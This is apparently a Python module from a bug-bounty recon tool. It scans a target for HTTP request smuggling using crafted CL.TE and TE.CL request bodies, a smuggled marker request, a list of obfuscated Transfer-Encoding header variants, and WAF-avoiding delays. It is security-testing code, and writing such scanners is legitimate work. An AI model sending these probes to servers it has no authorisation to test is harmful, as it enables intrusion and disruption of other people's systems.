import re
import asyncio
from core.ui import vuln, found, CYN, RED, GRY, RESET, info
from core.http import http_probe
from . import BaseScanner
import logging
logger = logging.getLogger("bb-recon")

class HTTPSmugglingScanner(BaseScanner):
    async def scan(self, url: str) -> list:
        findings = []
        await self._waf_sleep()

        parsed, _ = self._get_params(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        clte_payloads = [
            (
                "POST / HTTP/1.1\r\n"
                f"Host: {parsed.netloc}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 6\r\n"
                "Transfer-Encoding: chunked\r\n\r\n"
                "0\r\n\r\nX",
                "CL.TE",
            ),
        ]

        for payload_desc, technique in [("CL.TE", "CL.TE"), ("TE.CL", "TE.CL")]:
            try:
                if technique == "CL.TE":
                    smuggle_body = "0\r\n\r\nGET /bbr3c0n_smuggle HTTP/1.1\r\nHost: {}\r\n\r\n".format(parsed.netloc)
                    headers = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Transfer-Encoding": "chunked",
                    }
                    code1, body1, hdrs1, ms1 = await http_probe(
                        self.session, base + "/", timeout=10, method="POST",
                        data=smuggle_body, extra_headers=headers
                    )
                    await self._waf_sleep()

                    code2, body2, hdrs2, ms2 = await http_probe(
                        self.session, base + "/", timeout=10
                    )

                    if code2 in (404, 400) and "bbr3c0n_smuggle" in body2.lower():
                        vuln(f"HTTP REQUEST SMUGGLING (CL.TE): {base}")
                        findings.append({
                            "type": "HTTPSmuggling", "url": base,
                            "technique": "CL.TE", "severity": "CRITICAL",
                            "evidence": "Smuggled request path reflected in second response",
                        })
                        continue

                    if ms2 > 5000 and ms1 < 2000:
                        found(f"HTTP Smuggling indicator (CL.TE timing): {base}")
                        findings.append({
                            "type": "HTTPSmuggling-timing", "url": base,
                            "technique": "CL.TE", "severity": "HIGH",
                            "confidence": "LIKELY",
                            "evidence": f"Normal={ms1}ms, After-smuggle={ms2}ms",
                        })

                elif technique == "TE.CL":
                    smuggle_body = "1\r\nZ\r\nQ\r\n\r\n"
                    headers = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Content-Length": str(len(smuggle_body) + 100),
                        "Transfer-Encoding": "chunked",
                    }
                    code1, body1, hdrs1, ms1 = await http_probe(
                        self.session, base + "/", timeout=15, method="POST",
                        data=smuggle_body, extra_headers=headers
                    )

                    if ms1 > 8000:
                        found(f"HTTP Smuggling indicator (TE.CL timeout): {base}")
                        findings.append({
                            "type": "HTTPSmuggling-timeout", "url": base,
                            "technique": "TE.CL", "severity": "HIGH",
                            "confidence": "LIKELY",
                            "evidence": f"Response delayed {ms1}ms — server may be waiting for more data",
                        })

            except Exception as e:
                logger.debug(f"Smuggling test failed on {base}: {e}")

        for te_variant in [
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked",
            "Transfer-encoding: cow",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: xchunked",
            " Transfer-Encoding: chunked",
            "X: x\nTransfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
        ]:
            try:
                header_key = te_variant.split(":")[0].strip()
                header_val = ":".join(te_variant.split(":")[1:]).strip() if ":" in te_variant else "chunked"
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    header_key: header_val,
                }
                code, body, hdrs, ms = await http_probe(
                    self.session, base + "/", timeout=10, method="POST",
                    data="0\r\n\r\n", extra_headers=headers
                )
                await self._waf_sleep()

                if code == 200 and ms < 3000:
                    te_in_resp = any("transfer-encoding" in k.lower() for k in hdrs)
                    if te_in_resp:
                        found(f"TE.TE obfuscation variant accepted: {te_variant[:40]}")
                        findings.append({
                            "type": "HTTPSmuggling-TEVariant", "url": base,
                            "technique": f"TE.TE ({te_variant[:40]})",
                            "severity": "MEDIUM", "confidence": "POSSIBLE",
                        })
                        break
            except Exception:
                continue

        return findings
